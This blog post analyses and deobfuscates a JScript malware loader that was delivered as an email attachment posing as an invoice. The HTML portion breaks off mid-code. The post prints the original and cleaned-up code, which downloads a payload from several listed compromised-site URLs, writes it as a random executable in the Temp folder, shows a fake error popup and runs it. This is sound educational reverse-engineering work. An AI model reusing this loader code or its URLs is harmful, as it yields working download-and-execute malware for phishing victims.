<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Deobfuscating a JS Malware Loader | meltingcomputer</title>
<meta name="keywords" content="">
<meta name="description" content="I&rsquo;ve been collecting malware samples for quite some time and decided to try deobfuscating and reversing one to understand what it does.
The sample I&rsquo;ve chosen is one PAY75173152798.js (0dde38d34e4ddd5b43cbfe6aa52db911), a malicious file that is delivered as a file attachment in an email. I do not have a copy of the email this sample was originally attached with, but judging by the name I assume it would pretend to be an invoice or receipt.">
<meta name="author" content="">
<link rel="canonical" href="https://meltingcomputer.github.io/posts/deobfuscating-a-js-malware-loader/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://meltingcomputer.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://meltingcomputer.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://meltingcomputer.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://meltingcomputer.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://meltingcomputer.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Deobfuscating a JS Malware Loader" />
<meta property="og:description" content="I&rsquo;ve been collecting malware samples for quite some time and decided to try deobfuscating and reversing one to understand what it does.
The sample I&rsquo;ve chosen is one PAY75173152798.js (0dde38d34e4ddd5b43cbfe6aa52db911), a malicious file that is delivered as a file attachment in an email. I do not have a copy of the email this sample was originally attached with, but judging by the name I assume it would pretend to be an invoice or receipt." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://meltingcomputer.github.io/posts/deobfuscating-a-js-malware-loader/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-04T21:28:06-04:00" />
<meta property="article:modified_time" content="2023-06-04T21:28:06-04:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Deobfuscating a JS Malware Loader"/>
<meta name="twitter:description" content="I&rsquo;ve been collecting malware samples for quite some time and decided to try deobfuscating and reversing one to understand what it does.
The sample I&rsquo;ve chosen is one PAY75173152798.js (0dde38d34e4ddd5b43cbfe6aa52db911), a malicious file that is delivered as a file attachment in an email. I do not have a copy of the email this sample was originally attached with, but judging by the name I assume it would pretend to be an invoice or receipt."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://meltingcomputer.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Deobfuscating a JS Malware Loader",
      "item": "https://meltingcomputer.github.io/posts/deobfuscating-a-js-malware-loader/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Deobfuscating a JS Malware Loader",
  "name": "Deobfuscating a JS Malware Loader",
  "description": "I\u0026rsquo;ve been collecting malware samples for quite some time and decided to try deobfuscating and reversing one to understand what it does.\nThe sample I\u0026rsquo;ve chosen is one PAY75173152798.js (0dde38d34e4ddd5b43cbfe6aa52db911), a malicious file that is delivered as a file attachment in an email. I do not have a copy of the email this sample was originally attached with, but judging by the name I assume it would pretend to be an invoice or receipt.",
  "keywords": [
    
  ],
  "articleBody": "I’ve been collecting malware samples for quite some time and decided to try deobfuscating and reversing one to understand what it does.\nThe sample I’ve chosen is one PAY75173152798.js (0dde38d34e4ddd5b43cbfe6aa52db911), a malicious file that is delivered as a file attachment in an email. I do not have a copy of the email this sample was originally attached with, but judging by the name I assume it would pretend to be an invoice or receipt.\nThe main reason I chose this sample specifically is because it is written in JScript. JScript is technically just JavaScript, but given a different name due to trademark disputes between Microsoft and Sun. JavaScript (and JScript by proxy) are not compiled languages, meaning that I won’t have to decompile any machine code and can just look straight at the source code of the file and understand how it works by opening it in a text editor.\nOf course, the malware authors know this and aren’t going to let malware researchers poke around in their code that easily. The most common way to make analysis more difficult is by obfuscating the code: making the code unnecessarily complicated and hard to read.\nShifty Strings Looking at the top of the file, we see two points of interest:\nvar _0x1fa5 = [ 'Write', 'Position', 'CreateObject', 'WScript.Shell', 'There\\x20was\\x20an\\x20error\\x20opening\\x20this\\x20document.\\x20The\\x20file\\x20is\\x20damaged\\x20and\\x20could\\x20not\\x20be\\x20repaired\\x20(for\\x20example,\\x20it\\x20was\\x20sent\\x20as\\x20an\\x20email\\x20attachment\\x20and\\x20wasn\\x27t\\x20correctly\\x20decoded).', 'Not\\x20Supported\\x20File\\x20Format', 'Popup', 'Run', 'open', 'GET', 'send', 'status', 'ResponseBody', 'http://bekkedekor.com/wp-content/uploads/G_I/', 'Scripting.FileSystemObject', 'random', 'toString', 'substr', 'GetSpecialFolder', 'Type' ]; ( function(_0x40f17f,_0x53e585){ var _0x3b3208 = function(_0x4aa583){ while(-- _0x4aa583){ _0x40f17f['push'](_0x40f17f['shift']()); } }; _0x3b3208(++ _0x53e585); }(_0x1fa5, 0x184) ); The first is a big array of strings, _0x1fa5, and the second is an immediately invoked function that is being called with both the array and the hexadecimal number 0x184 as arguments.\nThe function defines another function within itelf that takes in a number _0x4aa583 and then .pushes and .shifts an array _0x40f17f that many times using a while loop.\n.shift() returns the leftmost item in an array, and removes it from the array. By using _0x40f17f.push(_0x40f17f.shift()), the leftmost item in the array is being removed by .shift() and then appended to the end of the array with .push()\nFor example, an array of [1,2,3] would become [2,3,1]\nThis is being used to obfuscate what items in the array are supposed to go where, by shifting everything to the left 0x184 (decimal 388) times. Knowing this, I can rename the variables to get a clearer understanding of the function.\n( function(arrayToShift, key){ var shiftArray = function(amountToShift){ while(-- amountToShift){ arrayToShift['push'](arrayToShift['shift']()); } }; shiftArray(++ key); }(bigArrayOfStrings, 388) ); It’s worth noting that the array is already shifted 388 items to the right and so this function is un-shifting the array into the proper order the rest of the malware expects it to be in.\nAfter being un-shifted, the array is now\n[ \"open\", \"GET\", \"send\", \"status\", \"ResponseBody\", \"http://bekkedekor.com/wp-content/uploads/G_I/\", \"Scripting.FileSystemObject\", \"random\", \"toString\", \"substr\", \"GetSpecialFolder\", \"Type\", \"Write\", \"Position\", \"CreateObject\", \"WScript.Shell\", \"There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and wasn't correctly decoded).\", \"Not Supported File Format\", \"Popup\", \"Run\" ] The next part of the file defines a function:\nvar _0x1f80 = function(_0x2699a9, _0x501e82){ _0x2699a9 = _0x2699a9 - 0x0; var _0x5b6c40 = bigArrayOfStrings[_0x2699a9]; return _0x5b6c40; }; The function takes in a number (the second parameter is unused), subtracts it by 0 (???) and then returns the item at that index in the big array.\nCleaning this up, it’s just a complicated way to return bigArrayOfStrings[i]\nvar getBigArrayItem = function(index){ return bigArrayOfStrings[index]; }; !![] !??! The next function actually has an unobfuscated name!\nfunction getDataFromUrl(_0x3b1cb2, _0x55d28b){ try { var _0x2a0d9c = new ActiveXObject('MSXML2.XMLHTTP'); _0x2a0d9c[getBigArrayItem('0x0')](getBigArrayItem('0x1'), _0x3b1cb2, ![]); _0x2a0d9c[getBigArrayItem('0x2')](); if(_0x2a0d9c[getBigArrayItem('0x3')] == 0xc8){ return _0x55d28b(_0x2a0d9c[getBigArrayItem('0x4')], ![]); } else { return _0x55d28b(null, !![]); } } catch(_0x373527){ return _0x55d28b(null, !![]); } } The function has two parameters, what I can assume is a URL and a callback function.\nThe function creates an XMLHTTP object and then calls some methods of it using the big array.\nThe most interesting quirk of this function however are these empty arrays.\nWell it turns out that for some reason ![] evaluates to false and !![] evaluates to true. Just another weird way of obfuscating the true functionality of this code.\nRenaming variables and substituting the items called with getBigArrayItem(), the code looks clearer:\nfunction getDataFromUrl(url, callback){ try { var XMLHTTPObject = new ActiveXObject('MSXML2.XMLHTTP'); XMLHTTPObject.open(\"GET\", url, false); XMLHTTPObject.send(); if(XMLHTTPObject.status == 200){ return callback(XMLHTTPObject.ResponseBody, false); } else { return callback(null, true); } } catch(_0x373527){ return callback(null, true); } } It’s now a lot clearer what the function does. Takes in a URL, performs a GET request then returns the response if successful. If the request fails or the status code isn’t 200, the second variable returned in the callback is true, leading me to believe that the second parameter would be named something along the lines of failed\nAlso, I have no idea what _0x373527 is. It isn’t referenced anywhere else in the file.\nThe next function reminds me of my first JavaScript project:\nAs much as this hurts to look at, it at least also has an unobfuscated name of getData\nfunction getData(_0x1aaca7){ try { getDataFromUrl('http://www.bekkedekor.com/wp-content/uploads/R_b/', function(_0x3f9061, _0x8a6fe0){ if(!_0x8a6fe0){ return _0x1aaca7(_0x3f9061, ![]); } else { getDataFromUrl('http://www.bayonetrobles.com/wp-includes/fi_g/', function(_0x3f9061, _0x8a6fe0){ if(!_0x8a6fe0){ return _0x1aaca7(_0x3f9061, ![]); } else { getDataFromUrl(getBigArrayItem('0x5'), function(_0x3f9061, _0x8a6fe0){ if(!_0x8a6fe0){ return _0x1aaca7(_0x3f9061, ![]); } else { getDataFromUrl('http://association-bts-clim-souillac.shop/wp-content/T_q/', function(_0x3f9061, _0x8a6fe0){ if(!_0x8a6fe0){ return _0x1aaca7(_0x3f9061, ![]) } else { getDataFromUrl('http://kannada.awgp.org/wp-content/uploads/eq_Q/', function(_0x3f9061, _0x8a6fe0){ if(!_0x8a6fe0){ return _0x1aaca7(_0x3f9061, ![]); } else { return _0x1aaca7(null, !![]); } }); } }); } }); } }); } }); } catch(_0x3b48dd){ return _0x1aaca7(null, !![]); } } The function just takes in a callback function, and calls getDataFromUrl on a bunch of hard-coded URLs, as well as one in the big array. The function seems to return the callback with the same format as getData, with the last argument returning false if successful and true if failed.\nCleaning it up we get\nfunction getData(callback){ try { getDataFromUrl('http://www.bekkedekor.com/wp-content/uploads/R_b/', function(data, failed){ if(!failed){ return callback(data, false); } else { getDataFromUrl('http://www.bayonetrobles.com/wp-includes/fi_g/', function(data, failed){ if(!failed){ return callback(data, false); } else { getDataFromUrl(\"http://bekkedekor.com/wp-content/uploads/G_I/\", function(data, failed){ if(!failed){ return callback(data, false); } else { getDataFromUrl('http://association-bts-clim-souillac.shop/wp-content/T_q/', function(data, failed){ if(!failed){ return callback(data, false) } else { getDataFromUrl('http://kannada.awgp.org/wp-content/uploads/eq_Q/', function(data, failed){ if(!failed){ return callback(data, false); } else { return callback(null, true); } }); } }); } }); } }); } }); } catch(_0x3b48dd){ return callback(null, true); } } So the function goes down the list trying every URL until it finds one that succeeds, then returns the ResponseBody from the request.\nThe Bad Stuff™ These next couple functions are where this script’s malicious intentions are shown.\nA function called getTempFilePath is pretty self explanatory, and substituting in the values from the big array it is made even more clear:\nfunction getTempFilePath(){ try{ var _0x40e2ac = new ActiveXObject('Scripting.FileSystemObject'); var _0x8419b0 = '\\x5c' + Math.random().toString(36).substr(2, 9) + '.exe'; var _0x123c3d = _0x40e2ac.GetSpecialFolder(2) + _0x8419b0; return _0x123c3d; } catch(_0xdfa6af){ return ![]; } } The function creates a FileSystemObject and generates a random string starting with “\" (\\x5c) and ending with “.exe”\nThat random string is then appended onto GetSpecialFolder(2) (the path of the Temp folder) and returned. e.g. %TEMP%\\242986749624.exe\nThe next function called saveToTemp, does exactly that. It calls getTempFilePath and writes the data from its first parameter to the file path. I’ve renamed some variables for readability\nfunction saveToTemp(data, callback){ try { var tempFilePath = getTempFilePath(); if(tempFilePath){ var stream = new ActiveXObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(data); stream.Position = 0; stream.SaveToFile(tempFilePath, 2); stream.Close(); return callback(tempFilePath, false); } else { return callback(null, true); } } catch(_0x500759) { return callback(null, true); } } Pretty boring, but simple enough.\nAll together now! With all these functions defined, the last chunk of the file is what actually calls them:\ngetData(function(_0x241c32, _0x265816){ WshShell = WScript[_0x1f80('0xe')](_0x1f80('0xf')); Text = _0x1f80('0x10'); Title = _0x1f80('0x11'); Res = WshShell[_0x1f80('0x12')](Text, 0x0, Title, 0x0 + 0x40); if(!_0x265816){ saveToTemp(_0x241c32, function(_0x549678,_0x265816){ if(!_0x265816){ try{ var _0x5578e7 = new ActiveXObject(_0x1f80('0xf')); _0x5578e7[_0x1f80('0x13')](_0x549678); } catch(_0x2e70a6){} } }); } }); Something common in almost all JScript malware is the use of WScript.Shell, and this is no exception. We can see unobfuscated references to WshShell and WScript.\nWScript.Shell exposes a bunch of windows shell functionality, the most useful for malware being the ability to run an executable, perhaps one downloaded and saved to a specific random temporary file?\nCleaned up, the code looks like this:\ngetData(function(data, failed){ WshShell = WScript.CreateObject('WScript.Shell'); Text = \"There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and wasn't correctly decoded).\"; Title = \"Not Supported File Format\"; Res = WshShell.Popup(Text, 0, Title, 64); if(!failed){ saveToTemp(data, function(filePath, failed){ if(!failed){ try{ var shell = new ActiveXObject('WScript.Shell'); shell.Run(filePath); } catch(_0x2e70a6){ } } }); } }); The script creates a WScript.Shell object which creates a popup message that looks like this:\n\u003ePopup Message This message is written to look like a system error message, probably to try and explain why no document opens when the user runs the file, even though it is pretending to be an invoice. After all, I would be a lot more suspicious of a file that did nothing when ran versus one that shows an error.\nThe code then downloads the payload from getData, saves it using saveToTemp and then runs it with a new WScript.Shell. That’s it. All of this to just download and run a second stage payload from the internet.\n(Un)fortunately, all the websites seem to 404 when I tried to access them which makes sense since this specific sample is 3 years old now. Dead end it seems.\nI’ve learned a lot from this project and it was fun trying to figure out how all of these obfuscation techniques work and can be reversed. The sample is available on Malware Bazaar using the md5 0dde38d34e4ddd5b43cbfe6aa52db911. Even though the servers for this sample have been shut down, still be careful whenever handling malware samples.\n",
  "wordCount" : "1643",
  "inLanguage": "en",
  "datePublished": "2023-06-04T21:28:06-04:00",
  "dateModified": "2023-06-04T21:28:06-04:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://meltingcomputer.github.io/posts/deobfuscating-a-js-malware-loader/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "meltingcomputer",
    "logo": {
      "@type": "ImageObject",
      "url": "https://meltingcomputer.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://meltingcomputer.github.io" accesskey="h" title="meltingcomputer (Alt + H)">meltingcomputer</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      Deobfuscating a JS Malware Loader
    </h1>
    <div class="post-meta"><span title='2023-06-04 21:28:06 -0400 EDT'>June 4, 2023</span>

</div>
  </header> 
  <div class="post-content"><p>I&rsquo;ve been collecting malware samples for quite some time and decided to try deobfuscating and reversing one to understand what it does.</p>
<p>The sample I&rsquo;ve chosen is one <code>PAY75173152798.js</code> (0dde38d34e4ddd5b43cbfe6aa52db911), a malicious file that is delivered as a file attachment in an email. I do not have a copy of the email this sample was originally attached with, but judging by the name I assume it would pretend to be an invoice or receipt.</p>
<p>The main reason I chose this sample specifically is because it is written in <a href="https://en.wikipedia.org/wiki/JScript">JScript</a>. JScript  is <em>technically</em> just JavaScript, but given a different name due to trademark disputes between Microsoft and Sun. JavaScript (and JScript by proxy) are not compiled languages, meaning that I won&rsquo;t have to decompile any machine code and can just look straight at the source code of the file and understand how it works by opening it in a text editor.</p>
<p>Of course, the malware authors know this and aren&rsquo;t going to let malware researchers poke around in their code that easily. The most common way to make analysis more difficult is by obfuscating the code: making the code unnecessarily complicated and hard to read.</p>
<h1 id="shifty-strings">Shifty Strings<a hidden class="anchor" aria-hidden="true" href="#shifty-strings">#</a></h1>
<p>Looking at the top of the file, we see two points of interest:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x1fa5</span> <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Write&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Position&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;CreateObject&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;WScript.Shell&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;There\x20was\x20an\x20error\x20opening\x20this\x20document.\x20The\x20file\x20is\x20damaged\x20and\x20could\x20not\x20be\x20repaired\x20(for\x20example,\x20it\x20was\x20sent\x20as\x20an\x20email\x20attachment\x20and\x20wasn\x27t\x20correctly\x20decoded).&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Not\x20Supported\x20File\x20Format&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Popup&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Run&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;open&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;GET&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;send&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;status&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ResponseBody&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://bekkedekor.com/wp-content/uploads/G_I/&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Scripting.FileSystemObject&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;random&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;toString&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;substr&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;GetSpecialFolder&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Type&#39;</span>
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x40f17f</span>,<span style="color:#a6e22e">_0x53e585</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x3b3208</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x4aa583</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span>(<span style="color:#f92672">--</span> <span style="color:#a6e22e">_0x4aa583</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_0x40f17f</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">_0x40f17f</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x3b3208</span>(<span style="color:#f92672">++</span> <span style="color:#a6e22e">_0x53e585</span>);
</span></span><span style="display:flex;"><span>    }(<span style="color:#a6e22e">_0x1fa5</span>, <span style="color:#ae81ff">0x184</span>)
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>The first is a big array of strings, <code>_0x1fa5</code>, and the second is an immediately invoked function that is being called with both the array and the hexadecimal number <code>0x184</code> as arguments.</p>
<p>The function defines another function within itelf that takes in a number <code>_0x4aa583</code> and then <code>.push</code>es and <code>.shift</code>s an array <code>_0x40f17f</code> that many times using a while loop.</p>
<p><code>.shift()</code> returns the leftmost item in an array, and removes it from the array. By using <code>_0x40f17f.push(_0x40f17f.shift())</code>, the leftmost item in the array is being removed by <code>.shift()</code> and then appended to the end of the array with <code>.push()</code></p>
<p>For example, an array of <code>[1,2,3]</code> would become <code>[2,3,1]</code></p>
<p>This is being used to obfuscate what items in the array are supposed to go where, by shifting everything to the left 0x184 (decimal 388) times. Knowing this, I can rename the variables to get a clearer understanding of the function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">arrayToShift</span>, <span style="color:#a6e22e">key</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shiftArray</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">amountToShift</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span>(<span style="color:#f92672">--</span> <span style="color:#a6e22e">amountToShift</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">arrayToShift</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">arrayToShift</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">shiftArray</span>(<span style="color:#f92672">++</span> <span style="color:#a6e22e">key</span>);
</span></span><span style="display:flex;"><span>    }(<span style="color:#a6e22e">bigArrayOfStrings</span>, <span style="color:#ae81ff">388</span>)
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>It&rsquo;s worth noting that the array is already shifted 388 items to the <strong>right</strong> and so this function is un-shifting the array into the proper order the rest of the malware expects it to be in.</p>
<p>After being un-shifted, the array is now</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;open&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;GET&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;send&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;status&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ResponseBody&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;http://bekkedekor.com/wp-content/uploads/G_I/&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;random&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;toString&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;substr&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;GetSpecialFolder&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Type&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Write&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Position&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;CreateObject&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;WScript.Shell&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and wasn&#39;t correctly decoded).&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Not Supported File Format&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Popup&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Run&#34;</span>
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>The next part of the file defines a function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x1f80</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x2699a9</span>, <span style="color:#a6e22e">_0x501e82</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_0x2699a9</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x2699a9</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x5b6c40</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bigArrayOfStrings</span>[<span style="color:#a6e22e">_0x2699a9</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x5b6c40</span>;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>The function takes in a number (the second parameter is unused), subtracts it by 0 (???) and then returns the item at that index in the big array.</p>
<p>Cleaning this up, it&rsquo;s just a complicated way to return <code>bigArrayOfStrings[i]</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">getBigArrayItem</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">index</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">bigArrayOfStrings</span>[<span style="color:#a6e22e">index</span>];
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><h1 id="-">!![] !??!<a hidden class="anchor" aria-hidden="true" href="#-">#</a></h1>
<p>The next function actually has an unobfuscated name!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#a6e22e">_0x3b1cb2</span>, <span style="color:#a6e22e">_0x55d28b</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x2a0d9c</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
